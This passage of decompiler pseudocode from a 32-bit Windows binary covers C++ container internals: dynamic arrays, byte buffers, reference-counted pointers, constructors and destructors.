  v16 = sub_1000B6B7(v26, (int)v21, 6, *(_DWORD *)(this + 48) - 6);
  LOBYTE(v25) = 7;
  v17 = v24;
  v18 = (*(int (__stdcall **)(int, _DWORD))(*(_DWORD *)v22[0] + 4))(v16, *(unsigned __int16 *)(v24 + 32));
  v22[2] = v18;
  LOBYTE(v25) = 2;
  sub_1000B3DF(v21);
  v25 = 1;
  if ( v18 )
  {
    sub_1000B768(v19, v26, 4, v18);
    v20 = sub_1000B6B7(v26, (int)v21, 0, v18 + 6);
    LOBYTE(v25) = 9;
    v7 = (*(int (__thiscall **)(int, int))(*(_DWORD *)v17 + 12))(v17, v20);
    LOBYTE(v25) = 1;
    sub_1000B3DF(v21);
    goto LABEL_7;
  }
  v25 = -1;
  sub_10044C74(v22);
  return 0;
}
// 1002D343: variable 'v5' is possibly undefined
// 1002D4EA: variable 'v19' is possibly undefined
// 1002D31A: using guessed type int var_38[5];

//----- (1002D55A) --------------------------------------------------------
char __thiscall sub_1002D55A(_DWORD *this)
{
  int v1; // eax
  int v2; // eax

  v1 = this[7];
  if ( !v1 )
    return 30;
  v2 = v1 - 1;
  if ( !v2 )
    return -17;
  if ( v2 == 1 )
    return -15;
  return 0;
}

//----- (1002D574) --------------------------------------------------------
void __usercall sub_1002D574(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10040447((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}

//----- (1002D5B7) --------------------------------------------------------
void __thiscall sub_1002D5B7(int *this)
{
  *this = (int)&off_101032E0;
  sub_1001ECA1(this + 14);
  sub_1000780D(this + 12);
  sub_1002E18F(this + 2);
  *this = (int)&off_10103440;
}
// 101032E0: using guessed type int (__thiscall *off_101032E0)(void *Block, char);
// 10103440: using guessed type int (__thiscall *off_10103440)(void *Block, char);

//----- (1002D605) --------------------------------------------------------
char sub_1002D605()
{
  return 20;
}

//----- (1002D608) --------------------------------------------------------
int *__thiscall sub_1002D608(int *Block, char a2)
{
  sub_1002D5B7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002D624) --------------------------------------------------------
int __thiscall sub_1002D624(int *this, int a2, int a3)
{
  int v4; // esi
  int v5; // edi
  int v6; // esi
  _DWORD *v8; // eax
  int v9; // eax
  _DWORD *v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD v13[2]; // [esp+10h] [ebp-20h] BYREF
  _DWORD *v14[5]; // [esp+18h] [ebp-18h] BYREF
  int v15; // [esp+2Ch] [ebp-4h]

  sub_1000EDE4(this + 14, v14);
  v15 = 0;
  v4 = a2;
  v5 = *(_DWORD *)(a2 + 12);
  if ( v5 + this[11] <= (unsigned int)(*(int (__thiscall **)(int *))(*this + 12))(this) )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int *, int *))(this[2] + 8))(this + 2, &a3) )
    {
      v8 = operator new(0x24u);
      v14[2] = v8;
      LOBYTE(v15) = 1;
      if ( v8 )
        v9 = sub_1001AC1E((int)v8);
      else
        v9 = 0;
      LOBYTE(v15) = 0;
      v10 = sub_1000728E(v13, v9);
      LOBYTE(v15) = 2;
      v11 = (_DWORD *)(*(int (__thiscall **)(int *, int *))(this[2] + 16))(this + 2, &a3);
      sub_1003098B(v11, v10);
      LOBYTE(v15) = 0;
      sub_1000780D(v13);
      v4 = a2;
    }
    v12 = (_DWORD *)(*(int (__thiscall **)(int *, int *))(this[2] + 16))(this + 2, &a3);
    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)*v12 + 12))(*v12, v4);
    this[11] += *(_DWORD *)(v4 + 12);
    v6 = 0;
  }
  else
  {
    v6 = 1;
  }
  v15 = -1;
  sub_1000EDA4(v14);
  return v6;
}
// 1002D624: using guessed type _DWORD var_20[2];

//----- (1002D6F4) --------------------------------------------------------
void *__thiscall sub_1002D6F4(int *this, void *a2)
{
  void *v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  int v6; // esi
  void **v7; // ebx
  int v8; // edi
  int v9; // eax
  _DWORD *v10; // eax
  int v11; // eax
  _DWORD *v12; // eax
  void *v13; // ebx
  int v14; // eax
  _DWORD *v15; // eax
  void *v16; // eax
  int v17; // eax
  _DWORD *v18; // esi
  _DWORD *v19; // eax
  LONG *v20; // eax
  int v22[5]; // [esp+10h] [ebp-78h] BYREF
  int v23[5]; // [esp+24h] [ebp-64h] BYREF
  int v24; // [esp+38h] [ebp-50h] BYREF
  unsigned int v25; // [esp+3Ch] [ebp-4Ch]
  _DWORD *v26[2]; // [esp+48h] [ebp-40h] BYREF
  _DWORD v27[2]; // [esp+50h] [ebp-38h] BYREF
  char v28; // [esp+58h] [ebp-30h] BYREF
  int v29; // [esp+59h] [ebp-2Fh]
  void *Block; // [esp+60h] [ebp-28h]
  int v31; // [esp+64h] [ebp-24h] BYREF
  int v32; // [esp+68h] [ebp-20h]
  int v33; // [esp+6Ch] [ebp-1Ch]
  int *v34; // [esp+70h] [ebp-18h]
  void **v35; // [esp+74h] [ebp-14h]
  unsigned int v36; // [esp+78h] [ebp-10h]
  int v37; // [esp+84h] [ebp-4h]

  v34 = this;
  v28 = 0;
  v29 = 0;
  sub_1000B1F3(0, (int)a2, 0);
  v37 = 0;
  v33 = 1;
  sub_1000EDE4(this + 14, v26);
  v37 = 1;
  v3 = operator new(0x24u);
  Block = v3;
  LOBYTE(v37) = 2;
  if ( v3 )
    v4 = sub_1001AC1E((int)v3);
  else
    v4 = 0;
  LOBYTE(v37) = 1;
  v5 = sub_1000728E(&v31, v4);
  LOBYTE(v37) = 3;
  v6 = (int)v34;
  v7 = (void **)(v34 + 12);
  v35 = (void **)(v34 + 12);
  sub_1003098B(v34 + 12, v5);
  LOBYTE(v37) = 1;
  sub_1000780D(&v31);
  v8 = v6 + 8;
  v9 = *(_DWORD *)(v6 + 8);
  v32 = v6 + 8;
  (*(void (__thiscall **)(int, int *))(v9 + 48))(v6 + 8, &v24);
  LOBYTE(v37) = 4;
  v36 = 0;
  if ( v25 )
  {
    while ( 1 )
    {
      v28 = *(_BYTE *)(*(int (__thiscall **)(int *, unsigned int))(v24 + 48))(&v24, v36);
      v10 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v8 + 16))(v8, &v28);
      v29 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v10 + 4))(*v10);
      Block = *v7;
      v11 = sub_1000B1F3((void *)5, (int)v23, &v28);
      LOBYTE(v37) = 5;
      (*(void (__thiscall **)(void *, int))(*(_DWORD *)Block + 12))(Block, v11);
      LOBYTE(v37) = 4;
      sub_1000B3DF(v23);
      v12 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v8 + 16))(v8, &v28);
      v13 = *v35;
      v14 = (*(int (__thiscall **)(_DWORD, int *))(*(_DWORD *)*v12 + 36))(*v12, v22);
      LOBYTE(v37) = 6;
      (*(void (__thiscall **)(void *, int))(*(_DWORD *)v13 + 12))(v13, v14);
      LOBYTE(v37) = 4;
      sub_1000B3DF(v22);
      v15 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v8 + 16))(v8, &v28);
      *(_DWORD *)(v6 + 44) -= (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v15 + 4))(*v15);
      v16 = operator new(0x24u);
      Block = v16;
      LOBYTE(v37) = 7;
      v17 = v16 ? sub_1001AC1E((int)v16) : 0;
      LOBYTE(v37) = 4;
      v18 = sub_1000728E(v27, v17);
      LOBYTE(v37) = 8;
      v19 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v8 + 16))(v8, &v28);
      sub_1003098B(v19, v18);
      LOBYTE(v37) = 4;
      sub_1000780D(v27);
      ++v36;
      v7 = v35;
      if ( v36 >= v25 )
        break;
      v6 = (int)v34;
      v8 = v32;
    }
  }
  v20 = (LONG *)(*(int (__thiscall **)(void *, int *))(*(_DWORD *)*v7 + 36))(*v7, v22);
  LOBYTE(v37) = 9;
  sub_1000B3BD(v20, (int)a2);
  LOBYTE(v37) = 4;
  sub_1000B3DF(v22);
  LOBYTE(v37) = 1;
  sub_1002DA13((int)&v24);
  LOBYTE(v37) = 0;
  sub_1000EDA4(v26);
  return a2;
}
// 1002D6F4: using guessed type int var_64[5];
// 1002D6F4: using guessed type int var_78[5];
// 1002D6F4: using guessed type _DWORD var_38[2];

//----- (1002D8EF) --------------------------------------------------------
_DWORD *__thiscall sub_1002D8EF(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x1Cu);
  if ( v3 )
    v4 = sub_1002D960(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (1002D960) --------------------------------------------------------
_DWORD *__stdcall sub_1002D960(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_101033B4;
  a1[2] = off_101034C4;
  sub_1000728E(a1 + 4, 0);
  a1[6] = 0;
  return a1;
}
// 101033B4: using guessed type int (__stdcall *off_101033B4)(char);
// 101034C4: using guessed type int (__thiscall *off_101034C4[2])(void *Block, char);

//----- (1002D9AA) --------------------------------------------------------
int __thiscall sub_1002D9AA(int this)
{
  _BYTE *v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp-4h] [ebp-Ch]

  v2 = (_BYTE *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                  *(_DWORD *)(this + 4) + 4,
                  *(_DWORD *)(this + 24));
  v5 = *(_DWORD *)(this + 24);
  *(_BYTE *)(this + 12) = *v2;
  v3 = (_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                   *(_DWORD *)(this + 4) + 20,
                   v5);
  sub_1003098B((_DWORD *)(this + 16), v3);
  return this + 8;
}

//----- (1002D9DF) --------------------------------------------------------
_DWORD *__thiscall sub_1002D9DF(_DWORD *this, char a2)
{
  sub_10030EDD(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1002DA13) --------------------------------------------------------
void __thiscall sub_1002DA13(int this)
{
  *(_DWORD *)this = &off_101032F8;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  sub_10039F05((_DWORD *)this);
}
// 101032F8: using guessed type int (__thiscall *off_101032F8)(void *Block, char);

//----- (1002DA62) --------------------------------------------------------
int __thiscall sub_1002DA62(_DWORD *this, char *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  char v9; // [esp+17h] [ebp+Fh]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10139833);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_BYTE *)(i + this[3]) = *(_BYTE *)(i + this[3] - 1);
  result = this[3];
  *(_BYTE *)(a3 + result) = v9;
  ++this[1];
  return result;
}

//----- (1002DAC4) --------------------------------------------------------
int __thiscall sub_1002DAC4(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013986E);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_BYTE *)(v2 + this[3]) = *(_BYTE *)(v2 + this[3] + 1);
    ++v2;
  }
  *(_BYTE *)((*(int (__thiscall **)(_DWORD *))(*this + 4))(this) + this[3]) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1002DB0C) --------------------------------------------------------
int __thiscall sub_1002DB0C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013986F);
  return a2 + this[3];
}

//----- (1002DB28) --------------------------------------------------------
int __thiscall sub_1002DB28(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101398EE);
  return a2 + this[3];
}

//----- (1002DB44) --------------------------------------------------------
int __thiscall sub_1002DB44(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_BYTE *)(i + this[3]) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (1002DB83) --------------------------------------------------------
unsigned int __thiscall sub_1002DB83(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v7; // edx
  int *v8; // ecx
  unsigned int v9; // [esp+18h] [ebp+Ch]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101398EF);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v9 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v9 >= a2 )
      {
        v7 = *a4;
        v8 = a4;
      }
      else
      {
        v7 = *a3;
        v8 = a3;
      }
      (*(void (__thiscall **)(int *, unsigned int))(v7 + 36))(v8, v9 + this[3]);
      ++v9;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v9 < result );
  }
  return result;
}

//----- (1002DBF6) --------------------------------------------------------
void __thiscall sub_1002DBF6(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebp
  _BYTE *v7; // ebx
  _BYTE *v8; // edi
  int v9; // ebp
  unsigned int v10; // [esp+Ch] [ebp-Ch]
  int Size; // [esp+10h] [ebp-8h]
  void *Block; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      Size = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      Size = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v10 = 0;
    v7 = operator new(Size);
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = v7;
      v9 = (_BYTE *)v6 - v7;
      do
      {
        ++v10;
        *v8 = v8[v9];
        ++v8;
      }
      while ( v10 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v7;
    j__free(Block);
    this[2] = Size;
  }
}

//----- (1002DCA1) --------------------------------------------------------
int *__thiscall sub_1002DCA1(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_1000A89A(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1002DCE3) --------------------------------------------------------
void __thiscall sub_1002DCE3(_DWORD *this)
{
  char *v2; // eax

  *this = &off_10103358;
  v2 = (char *)this[3];
  if ( v2 )
    sub_1000A89A(v2);
  this[3] = 0;
  sub_10039F05(this);
}
// 10103358: using guessed type int (__thiscall *off_10103358)(void *Block, char);

//----- (1002DD35) --------------------------------------------------------
void __thiscall sub_1002DD35(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  int v8; // [esp+10h] [ebp-14h] BYREF
  volatile LONG *v9; // [esp+14h] [ebp-10h]
  int v10; // [esp+20h] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013993A);
  v9 = (volatile LONG *)a2[1];
  v8 = *a2;
  InterlockedIncrement(v9);
  v10 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_1003098B((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  sub_1003098B((_DWORD *)(v7 + 8 * a3), &v8);
  ++this[1];
  v10 = -1;
  sub_1000780D(&v8);
}

//----- (1002DDC6) --------------------------------------------------------
int __thiscall sub_1002DDC6(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013993B);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_1003098B((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1003098B((_DWORD *)(this[3] + 8 * v4), dword_10193BD8);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193BD8: using guessed type _DWORD dword_10193BD8[2];

//----- (1002DE1D) --------------------------------------------------------
int __thiscall sub_1002DE1D(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10139976);
  return this[3] + 8 * a2;
}

//----- (1002DE3B) --------------------------------------------------------
int __thiscall sub_1002DE3B(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_10139977);
  return this[3] + 8 * a2;
}

//----- (1002DE59) --------------------------------------------------------
char *__thiscall sub_1002DE59(_DWORD *this, char *a2)
{
  char *result; // eax
  char *v3; // esi

  result = a2;
  if ( this[2] < (unsigned int)a2 )
  {
    v3 = (char *)this[3];
    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_1000A89A(v3);
  }
  return result;
}

//----- (1002DE7F) --------------------------------------------------------
int __thiscall sub_1002DE7F(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_1000A89A(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1002DEA6) --------------------------------------------------------
int __thiscall sub_1002DEA6(_DWORD *this, unsigned int a2)
{
  unsigned int i; // ebx
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    sub_1003098B((_DWORD *)(this[3] + 8 * i), dword_10193BD8);
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}
// 10193BD8: using guessed type _DWORD dword_10193BD8[2];

//----- (1002DEF0) --------------------------------------------------------
unsigned int __thiscall sub_1002DEF0(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_101399F6);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 8 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 8 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1002DF62) --------------------------------------------------------
unsigned int __thiscall sub_1002DF62(void *this, unsigned int a2, int a3)
{
  unsigned int result; // eax
  _DWORD *v4; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a2 >= result )
  {
    v4 = sub_1000E8EF(&a2);
    sub_100078FE((int)v4);
  }
  return result;
}

//----- (1002DF98) --------------------------------------------------------
unsigned int __thiscall sub_1002DF98(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 29 != 0 ? -1 : 8 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(v7 + 1, 8u, v5, (void (__thiscall *)(void *))sub_1002E33E, sub_1000780D);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    do
    {
      sub_1003098B((_DWORD *)(8 * v10 + this[3]), (_DWORD *)(8 * v10 + a3));
      ++v10;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1002E03E) --------------------------------------------------------
void __thiscall sub_1002E03E(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // edi
  _DWORD *v9; // ebx
  char *i; // eax
  char *v11; // [esp+14h] [ebp-1Ch]
  int v12; // [esp+18h] [ebp-18h]
  _DWORD *v13; // [esp+1Ch] [ebp-14h]
  unsigned int v14; // [esp+20h] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v12 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v12 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v11 = (char *)this[3];
    v6 = (unsigned __int64)(unsigned int)v12 >> 29 != 0 ? -1 : 8 * v12;
    v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
    if ( v7 )
    {
      v8 = v7 + 1;
      *v7 = v12;
      `eh vector constructor iterator'(v7 + 1, 8u, v12, (void (__thiscall *)(void *))sub_1002E33E, sub_1000780D);
      v13 = v8;
    }
    else
    {
      v13 = 0;
    }
    v14 = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v9 = v13;
      for ( i = (char *)(v11 - (char *)v13); ; i = (char *)(v11 - (char *)v13) )
      {
        sub_1003098B(v9, (_DWORD *)((char *)v9 + (_DWORD)i));
        ++v14;
        v9 += 2;
        if ( v14 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
          break;
      }
    }
    this[3] = v13;
    if ( v11 )
      sub_1000A89A(v11);
    this[2] = v12;
  }
}

//----- (1002E147) --------------------------------------------------------
_DWORD *__stdcall sub_1002E147(_DWORD *a1)
{
  *a1 = off_100FBF5C;
  *a1 = &off_101032A4;
  sub_1002E3B2(a1 + 1, 4u);
  sub_1002E3FE(a1 + 5);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101032A4: using guessed type int (__thiscall *off_101032A4)(void *Block, char);

//----- (1002E18F) --------------------------------------------------------
void __thiscall sub_1002E18F(_DWORD *this)
{
  *this = &off_101032A4;
  sub_1002DCE3(this + 5);
  sub_1002DA13((int)(this + 1));
  sub_10039F05(this);
}
// 101032A4: using guessed type int (__thiscall *off_101032A4)(void *Block, char);

//----- (1002E1D2) --------------------------------------------------------
int __thiscall sub_1002E1D2(_DWORD *this, _BYTE *a2)
{
  _BYTE *v3; // esi
  int v4; // edi
  _DWORD *v6; // eax

  v3 = a2;
  v4 = sub_100313A7(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v3 )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1002E22F) --------------------------------------------------------
void __thiscall sub_1002E22F(void *this, int a2, int *a3)
{
  _DWORD *v4; // eax
  int v5; // [esp+10h] [ebp-14h] BYREF
  volatile LONG *v6; // [esp+14h] [ebp-10h]
  int v7; // [esp+20h] [ebp-4h]

  v6 = (volatile LONG *)a3[1];
  v5 = *a3;
  InterlockedIncrement(v6);
  v7 = 0;
  v4 = (_DWORD *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  sub_1003098B(v4, &v5);
  v7 = -1;
  sub_1000780D(&v5);
}

//----- (1002E27B) --------------------------------------------------------
_DWORD *__thiscall sub_1002E27B(_DWORD *this, _DWORD *a2)
{
  sub_1002E366(this + 1, a2);
  return a2;
}

//----- (1002E2AC) --------------------------------------------------------
_DWORD *__thiscall sub_1002E2AC(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 5;
  *a2 = off_100FBF5C;
  *a2 = &off_10103358;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[5] + 4))(this + 5);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_1002DF98(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103358: using guessed type int (__thiscall *off_10103358)(void *Block, char);

//----- (1002E306) --------------------------------------------------------
void *__thiscall sub_1002E306(void *Block, char a2)
{
  sub_1002DA13((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E322) --------------------------------------------------------
_DWORD *__thiscall sub_1002E322(_DWORD *Block, char a2)
{
  sub_1002DCE3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E33E) --------------------------------------------------------
void __thiscall sub_1002E33E(_DWORD *this)
{
  sub_1000728E(this, 0);
}

//----- (1002E34A) --------------------------------------------------------
_DWORD *__thiscall sub_1002E34A(_DWORD *Block, char a2)
{
  sub_1002E18F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002E366) --------------------------------------------------------
_DWORD *__userpurge sub_1002E366@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-24h]
  int v5; // [esp-4h] [ebp-20h]

  *a2 = off_100FBF5C;
  *a2 = &off_101032F8;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_1003114F(a2, v2, v4, v5);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101032F8: using guessed type int (__thiscall *off_101032F8)(void *Block, char);

//----- (1002E3B2) --------------------------------------------------------
_DWORD *__stdcall sub_1002E3B2(_DWORD *a1, unsigned int a2)
{
  size_t v2; // eax

  *a1 = off_100FBF5C;
  v2 = 1;
  for ( *a1 = &off_101032F8; v2 < a2; v2 *= 2 )
    ;
  a1[1] = 0;
  a1[2] = v2;
  a1[3] = operator new(v2);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 101032F8: using guessed type int (__thiscall *off_101032F8)(void *Block, char);

//----- (1002E3FE) --------------------------------------------------------
